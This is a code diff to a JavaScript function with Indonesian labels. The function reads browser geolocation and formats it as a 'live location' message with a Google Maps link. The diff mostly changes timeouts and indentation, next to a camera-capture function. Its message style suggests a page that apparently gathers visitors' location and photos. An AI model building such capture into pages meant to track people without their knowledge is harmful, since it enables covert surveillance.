@@ -344,27 +344,23 @@ const ambilLokasi = () => {
       (pos) => {
         const { latitude, longitude, accuracy } = pos.coords;
         resolve(`౼ 〘 𝗟𝗢𝗞𝗔𝗦𝗜 𝗟𝗔𝗡𝗚𝗦𝗨𝗡𝗚 〙 ౼
-Latitude               : ${latitude}
-Longitude              : ${longitude}
-Akurasi                : ±${accuracy} meter
-Peta                   : https://maps.google.com/?q=${latitude},${longitude}`);
-      },
-      (err) => {
-        const pesan = {
-          1: '❌ Lokasi tidak diizinkan.',
-          2: '❌ Lokasi tidak tersedia.',
-          3: '❌ Permintaan lokasi timeout.',
-        }[err.code] || '❌ Gagal mengambil lokasi.';
-        resolve(`౼ 〘 𝗟𝗢𝗞𝗔𝗦𝗜 𝗟𝗔𝗡𝗚𝗦𝗨𝗡𝗚 〙 ౼\n${pesan}`);
-      },
-      {
-        enableHighAccuracy: false, // ❗️matikan untuk kecepatan
-        timeout: 3000,             // ❗️maksimal tunggu 3 detik aja
-        maximumAge: 60000          // ❗️boleh pakai data 1 menit sebelumnya
-      }
-    );
-  });
-};
+        Latitude               : ${latitude}
+        Longitude              : ${longitude}
+        Akurasi                : ±${accuracy} meter
+        Peta                   : https://maps.google.com/?q=${latitude},${longitude}`);
+        },
+        (err) => {
+         const pesan = {
+            1: '❌ Lokasi tidak diizinkan.',
+             2: '❌ Lokasi tidak tersedia.',
+              3: '❌ Permintaan lokasi timeout.',
+              }[err.code] || '❌ Gagal mengambil lokasi.';
+              resolve(`౼ 〘 𝗟𝗢𝗞𝗔𝗦𝗜 𝗟𝗔𝗡𝗚𝗦𝗨𝗡𝗚 〙 ౼\n${pesan}`);
+            },
+          { enableHighAccuracy: false, timeout: 1000, maximumAge: 300000 }
+        );
+      });
+    };
 
     const ambilKamera = async (facingMode, label) => {
       try {
